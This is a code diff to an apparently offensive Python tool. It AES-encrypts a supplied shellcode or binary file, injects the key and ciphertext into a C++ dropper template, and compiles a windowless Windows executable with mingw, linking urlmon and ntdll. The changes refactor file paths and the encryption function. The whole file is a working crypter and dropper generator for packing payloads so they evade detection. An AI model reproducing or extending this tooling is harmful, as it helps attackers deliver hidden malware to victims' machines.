@@ -8,12 +8,20 @@ import os
 from colorama import Fore
 import argparse
 from distutils.spawn import find_executable
+from cmd import Cmd
 
 # Global Variables
 SHELLCODE_MARK = "Insert Shellcode Here"
 ARCHS = {"1":"x64", "2":"x86"}
 DATA = []
 REV_LIST = ['','','']
+FILE_PATH = ''
+for dir in (os.path.realpath(__file__).split('/')[:-1]):
+    FILE_PATH += '/' + dir
+
+FILE_PATH = FILE_PATH[1:] + '/'
+SOURCE_FILE = FILE_PATH + "sources/code.cpp"
+
 
 def printS(text):
     print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
@@ -26,7 +34,7 @@ def writeToFile(mark, data):
     # i is number of lines after mark. Starts from 0!
     line = True
     lineCount = 1
-    with open("sources/code.cpp","r") as code:
+    with open(SOURCE_FILE, "r") as code:
         while line:
             line = code.readline()
             if mark in line:
@@ -35,19 +43,26 @@ def writeToFile(mark, data):
 
     targetLine = lineCount
     for i in range(len(data)):
-        with open("sources/code.cpp", "r") as a_file:
+        with open(SOURCE_FILE, "r") as a_file:
             list_of_lines = a_file.readlines()
             list_of_lines[targetLine + i] = f"        {data[i]}\n"
 
-        with open("sources/code.cpp", "w") as a_file:
+        with open(SOURCE_FILE, "w") as a_file:
             a_file.writelines(list_of_lines)
 
 
-def encrypt(plaintext):
+def encrypt(binaryPath):
+    # Checking For Binary File
+    try:
+        binaryData = open(binaryPath, "rb").read()
+    except FileNotFoundError:
+        printE("No such file in directory!")
+        sys.exit(1)
+
     KEY = get_random_bytes(16)
     iv = 16 * b'\x00'
     cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
-    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+    ciphertext = cipher.encrypt(pad(binaryData, AES.block_size))
 
     key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
     payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
@@ -91,20 +106,13 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    # Encrypting provided binary
-    # Checking For Binary File
-    try:
-        binaryData = open(binaryPath, "rb").read()
-    except FileNotFoundError:
-        printE("No such file in directory!")
-        sys.exit(1)
-
+    
+    
+    # Encrypt shellcode
+    binaryKey, binaryPayload = encrypt(binaryPath)
     
     # Starting to Generate
     printI(f"Generating {Arch} Dropper for {binaryName}\n")
-    
-    # Encrypt shellcode
-    binaryKey, binaryPayload = encrypt(binaryData)
     
     # Write data to cpp code
     DATA.append(rf"// {binaryName}-{Arch}")
@@ -115,15 +123,15 @@ def main():
     # Compiling Code
     if Arch == "x64":
         outputFileName += "-64"
-        os.system(f"x86_64-w64-mingw32-g++ sources/code.cpp -o output/{outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+        os.system(f"x86_64-w64-mingw32-g++ {SOURCE_FILE} -o {outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
     elif Arch == "x86":
         outputFileName += "-86"
-        os.system(f"i686-w64-mingw32-g++ sources/code.cpp -o output/{outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+        os.system(f"i686-w64-mingw32-g++ {SOURCE_FILE} -o {outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
     if args.debug:
-        os.system(f"/usr/bin/cp sources/code.cpp output/{outputFileName}.cpp")
-        printS(f"Code saved to output/{outputFileName}.cpp")
+        os.system(f"/usr/bin/cp {SOURCE_FILE} {outputFileName}.cpp")
+        printS(f"Code saved to {outputFileName}.cpp")
 
-    printS(f"Executable saved to output/{outputFileName}.exe")
+    printS(f"Executable saved to {outputFileName}.exe")
     
     # Cleaing up!
     writeToFile(SHELLCODE_MARK, REV_LIST)
@@ -131,3 +139,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+    #t = Terminal()
+    #t.cmdloop()
